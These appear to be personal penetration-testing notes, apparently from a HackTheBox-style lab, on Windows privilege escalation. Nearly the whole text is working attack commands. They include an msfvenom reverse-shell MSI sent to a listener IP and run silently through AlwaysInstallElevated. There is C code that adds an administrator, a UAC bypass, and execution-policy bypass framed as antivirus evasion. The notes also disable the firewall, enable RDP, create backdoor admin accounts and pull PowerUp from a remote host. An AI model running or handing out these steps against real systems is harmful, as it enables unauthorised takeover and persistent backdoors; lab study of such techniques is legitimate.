
Always Install Elevated
---
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Enumerate
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
Generate MSI Package
```
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```
Upload the file, start a listener and execute for reverse shell
```
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

Adduser.exe
---
Save the below to adduser.c
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}h
```
Cross-compile to 64-bit
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

Bypassing UAC
---
After abusing AllwaysInstallElevated using PowerUp.ps1, we add a user to the administrators group
Even if we have a user in the Administrators group, accessing C:\Users\Administrator cannot be possible due to UAC. We can use the below script to bypass UAC
 [https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
```
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

Windows execution policy bypass - av evasion in practice
```
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Set-ExecutionPolicy bypass -scope process
powershell -ep bypass
```

Disable firewall and allow RDP
---
```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
```
```
netsh advfirewall set allprofiles state off
```

Add backdoor account
---
```
net user Backdoor Password1 /add
net localgroup Administrators Backdoor /add
net localgroup "Remote Management Users" Backdoor /add
net localgroup "Remote Desktop Users" Backdoor /add
net localgroup administrators backdoor /add
```

Runas
---
```
runas /user:[domain\user] cmd.exe
```

![[Pasted image 20260417164926.png]]

If we have access as nt authority/local service we can get more permissions with FullPowers.exe

If we find a web server like XAMPP we can upload an aspx/php shell, the user running the webserver often has SeImpersonate privileges.

PowerUp
---
```
iwr http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
..\PowerUp.ps1
```
```
Invoke-AllChecks
```